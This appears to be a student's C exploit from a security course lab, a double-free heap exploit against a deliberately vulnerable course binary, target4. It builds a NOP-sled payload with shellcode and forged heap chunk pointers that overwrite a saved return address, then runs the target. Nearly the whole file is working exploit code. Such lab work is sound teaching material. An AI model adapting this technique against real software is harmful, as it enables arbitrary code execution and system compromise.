/* sploit4.c
 *
 * William Ersing & Warren Smith
 * CSC 450
 *
 * This is a double free exploit that takes advantage of a flaw in
 * target4.c. The flaw is that a buffer is allocated for 'p' (1024 bytes)
 * on top of the already-freed buffer for 'q'. The result is that free() is
 * called on 'q' twice (double free). We can take advantage of this
 * double free by injecting our exploit string into the 1024 buffer, and
 * overwriting the header for 'q' so it points to the shellcode. 
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"
#define LOADSIZE 1024

int main(void){
  char *args[3];
  char *env[1];
  char load[LOADSIZE];
  int c_l, c_r, fake_r;

  c_l = 0x08049bc8;             // Left Chunk (points to start of shellcode)
  c_r = 0xbffffa8c;             // Right Chunk (points to saved eip of foo)
  fake_r = c_r + 1;             // Fake Right (sets flag bit to 1 & satisfies GET_FREEBIT(q))

  memset(load, 0x90, LOADSIZE - 1);     // Fill exploit string with NOPs

  memcpy((load + 2), "\xeb\x03", 2);        // Jump (eb = jmp) to flag bit in Fake Right

  *(unsigned long *)(load + 4) = fake_r;    // Place Fake Right to exploit string

  memcpy(load + (504 - strlen(shellcode)),
         shellcode, strlen(shellcode)); // Place shellcode at end of 'data' section in exploit string

  *(unsigned long *)(load + 504) = c_l;     // Point to start of shellcode

  *(unsigned long *)(load + 508) = c_r;     // Point to saved eip of foo

  load[LOADSIZE - 1] = 0;           // NULL terminate exploit string

  args[0] = TARGET;
  args[1] = load;
  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
